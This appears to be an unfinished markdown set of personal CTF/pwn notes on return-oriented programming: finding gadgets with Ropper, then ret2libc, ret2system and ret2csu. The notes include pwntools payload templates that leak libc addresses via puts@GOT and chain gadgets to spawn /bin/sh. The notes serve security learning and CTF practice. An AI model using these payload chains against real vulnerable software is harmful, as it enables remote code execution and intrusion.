
### in progress


# ROP
# how to find Gadgets (Ropper)
read the docs!
https://github.com/sashs/Ropper

Ropper is a tool that can display information about binary files in different file formats and can search for gadgets to build rop chains for different architectures (x86/X86_64, ARM/ARM64, MIPS/MIPS64, PowerPC/PowerPC64, SPARC64).

most usefull commands imo.

`(ropper) file vuln_binary` loads the specified binary into cache and analyze it than cleans up double gadgets. \
`(ropper) search /1/ pop r??` /1/ = search for gadgets with max 1 instruction + ret  \
? means non specific char so this will search for `pop rax`&`pop rdi`&`pop rsi` and so on \
`(ropper) semantic eax==1 !ebx` searches for a gadget that set eax to 1 and does not clobber ebx

# how to find Strings in an ELF	
searching manually
`strings -t x -a /path/to/binary | grep "string you searching"`

in a pwntools script
```
binary = ELF('/path/to/binary')
string = next(libc.search(b'string you searching'))
```

# how to pivote the Stack

# ret2techniques
	
<details>
    <summary>ret2libc (dynamically linked ELF)</summary>
        <div>

# ret2libc (dynamically linked ELF)
to use ret2libc we need to know two things
	
1. the exact libc version the ELF uses
2. the base addr of libc in the process
		

to find the exact version of libc we can leak some GOT entrys which stores pointers to the functions in libc. 
(we also need this for finding the base of libc in the process)

since we have the ELF file we can do this with ease as the GOT and PLT sections are known to us (asuming PIE is off)
```
payload = b''
payload += b'A'*0x10			#padding
payload += p64(pop_rdi)			#set first arg to the addr of puts@GOT
payload += p64(puts@GOT)		#addr puts@GOT
payload += p64(puts@PLT)		#call puts@PLT(puts@GOT)
```

this payload will print the libc addr of puts() in the current process.
puts_leak = `leaked addr here`

ok now ne know the exact addr of puts() in libc but we still dont know which libc version is used.
we will use a libc database like https://libc.blukat.me/ to find the exact version
libc.blukat will find the libc based of the last 3 nibbles of the leaked addr since these will always be the same 
		
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/libc_blukat.png">

usually you need to leak more than one libc function addr or the addr of a known string such as "/bin/sh" to find the exact libc version.

ok we now know the exact libc version now we can download the libc and calculate the offset from puts() to the base addr of libc in the process
use `vmmap` to find the libc base

```
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dbc000 0x00007ffff7de1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7de1000 0x00007ffff7f59000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f59000 0x00007ffff7fa3000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa3000 0x00007ffff7fa4000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa4000 0x00007ffff7fa7000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa7000 0x00007ffff7faa000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7faa000 0x00007ffff7fb0000 0x0000000000000000 rw- 
0x00007ffff7fc9000 0x00007ffff7fcd000 0x0000000000000000 r-- [vvar]
0x00007ffff7fcd000 0x00007ffff7fcf000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcf000 0x00007ffff7fd0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7fd0000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]

```

know_libc_base = `libc base here`		

offset = puts_leak - known_libc_base 		known_libc_base as it will change next time the ELF file is run (ASLR)
libc_base = puts_leak - offset

ok we now know the libc version and the exact libc_base inside the current process.
now we can use libc functions such as system("/bin/sh") we can setup the args and than simply call it from libc

1. setup the argument for system(pointer_binsh) 
2. call the libc function system()

```
payload = b''
payload += b'A'*0x10			#padding
payload += p64(pop_rdi)			#set first arg to /bin/sh pointer
payload += p64(pointer_binsh)		#addr of /bin/sh\x00 in mem
payload += p64(system)			#call the libc system function
```

</div>
</details>

<details>
    <summary>ret2system (statically linked ELF)</summary>
        <div>


# ret2system (statically linked ELF)
`syscall(rax,rdi,rsi,rdx)`	
we want to call `execve(pointer_binsh,0,0)` to spawn a shell

so we need to setup a `syscall(execve(pointer_binsh,0,0))`
		
1. find the syscall number for execve
2. find a gadget that can write to a pointer like `mov [rdi],rdx`
3. write b'/bin/sh\x00' to a writable addr.
4. setup the registers and than syscall

syscall numbers `https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit	`
we know the syscall number is 0x3b so we want to call `syscall(0x3b,pointer_binsh,0,0)`
we need a gadget that can write to a pointer to write `/bin/sh\x00` string somewhere
we can find such a gadget by using `ropper`

```
ropper /1/ mov [r??],r??
```		
i choose `mov [rdi],rdx` ... somethink like `mov [rax],rdx` would worked too.
since we have to set rdi = pointer_binsh and `mov [rdi],rdx` directly writes to rdi we saved some gadgets.
when using `mov [rax],rdx` we have to `mov rdi,rax` afterwards.


```
payload = b''
payload += b'A'*0x10			#padding
payload += p64(pop_rax)			#set rax to 0x3b
payload += p64(0x3b)
payload += p64(pop_rdi)			#set rdi to a .bss addr .bss is usually `rw-`
payload += p64(.bss)			#addr where we want to write to
payload += p64(pop_rdx)			#set rdx to `/bin/sh\x00`
payload += b`/bin/sh\x00`		#be carefull when you set this allways keep the 0x8 byte pad in mind e.g. when you want to call execve with `/bin/cat\x00`
payload += p64(write_gadget)		#writes the content of rdx = `/bin/sh\x00` into the addr rdi = `.bss` points to
payload += p64(pop_rsi)			#set rsi to 0
payload += p64(0x00)
payload += p64(pop_rdx)			#set rdx to 0
payload += p64(0x00)
payload += p64(syscall)				
```


</div>
</details>

<details>
    <summary>ret2csu(no sufficient gadgets to set rdi,rsi,rdx can be found)</summary>
        <div>
		
# ret2csu(no sufficient gadgets to set rdi,rsi,rdx can be found)

the `__libc_csu_init` function is responsible to initialize libc files.
in this function there are some interesting gadgets we can use.

first gadget let us controll some registers with pop

POPGADGET:
his will let us controllrbx,rbp,r12,r13,r14,r15
```
__libc_csu_init+90	POP        RBX
__libc_csu_init+91	POP        RBP
__libc_csu_init+92	POP        R12
__libc_csu_init+94 	POP        R13
__libc_csu_init+96	POP        R14
	        __libc_csu_init+98 	POP        R15
__libc_csu_init+100 	RET
```

CALLGADGET:
this will let us controll rdx,rsi and edi but we need to meet some conditions 
```         
__libc_csu_init+64	MOV        RDX,R14
__libc_csu_init+67 	MOV        RSI,R13
__libc_csu_init+70 	MOV        EDI,R12D
__libc_csu_init+73	CALL       qword ptr [R15 + RBX*0x8]
__libc_csu_init+77	ADD        RBX,0x1
__libc_csu_init+81	CMP        RBP,RBX
__libc_csu_init+84	JNE        __libc_csu_init+64
__libc_csu_init+86	ADD        RSP,0x8
__libc_csu_init+90	POP        RBX
__libc_csu_init+91	POP        RBP
__libc_csu_init+92	POP        R12
__libc_csu_init+94 	POP        R13
__libc_csu_init+96	POP        R14
__libc_csu_init+98 	POP        R15
__libc_csu_init+100 	RET
```


there ase some constrains in the caller gadget 
1.
we want to pass the JNE and dont take it.
```
rbx = 0x00 set to 0 since it will be incremented later
rbp = set to 1 so when compared to the incremented rbx 
```

```
__libc_csu_init+77	ADD        RBX,0x1
__libc_csu_init+81	CMP        RBP,RBX
__libc_csu_init+84	JNE        __libc_csu_init+64
       	 	
```
2.
we want to set r15 = to a valide function pointer rbx will be 0x00
```
__libc_csu_init+73	CALL       qword ptr [R15 + RBX*0x8]
```


```
putsgot = elf.got['puts']          
putsplt = elf.plt['puts']
pop_rdi = 0x00000000004011f3
pop_rsi_r15 = 0x00000000004011f1
ret = 0x4004e6

def ret2csu(call,rdi,rsi,rdx):
    payload = p64(0x4011ea)         # first call popper gadget

    payload += p64(0x00)            # pop rbx - set to 0 since it will be incremented later
    payload += p64(0x01)            # pop rbp - set to 1 so when compared to the incremented rbx 
    payload += p64(0x400000)       # pop r12 #edi only 4 bytes controll
    payload += p64(rsi)            # pop r13 #rsi
    payload += p64(rdx)            # pop r14 #rdx
    payload += p64(putsgot)            # pop r15 

    payload += p64(0x4011d0)        # 2nd call caller gadget

        #__libc_csu_init+64     MOV        RDX,R14
        #__libc_csu_init+67     MOV        RSI,R13
        #__libc_csu_init+70     MOV        EDI,R12D

    payload += p64(0x00)            # add rsp,0x8 padding cause __libc_csu_init+86  ADD RSP,0x8 


        #__libc_csu_init+90     POP        RBX
        #__libc_csu_init+91     POP        RBP
        #__libc_csu_init+92     POP        R12
        #__libc_csu_init+94     POP        R13
        #__libc_csu_init+96     POP        R14
        #__libc_csu_init+98     POP        R15
        #__libc_csu_init+100    RET

    payload += p64(0x00)            # rbx
    payload += p64(0x00)            # rbp
    payload += p64(0x00)            # r12
    payload += p64(0x00)            # r13
    payload += p64(0x00)            # r14
    payload += p64(0x00)            # r15

        #__libc_csu_init+100    RET

    payload += p64(pop_rdi)        
    payload += p64(rdi)             # update rdi with correct unconstrained content
    payload += p64(pop_rsi_r15)     
    payload += p64(rsi)             # update rsi with correct unconstrained content
    payload += p64(0x00)

        #we now have this registers under controll rdi,rsi,rdx,rbx,rbp,r12,r13,r14,r15

    payload += p64(call)            # actual wanted function call
    return payload

    rop = b'A'*16
    rop += ret2csu(putsplt, 0x7ffff7f735aa, 0x00, 0x00) # call(rdi,rsi,rdx)

```

For de-randomizing libc, we can use &GOT_TABLE, coupled with some read(), write() or send(), recv() (ie: usually available in CTF challenges)

<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2csu_gadgets.png">
		
</div>
</details>






# BROP 

# SROP
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/sigret_frame.png">
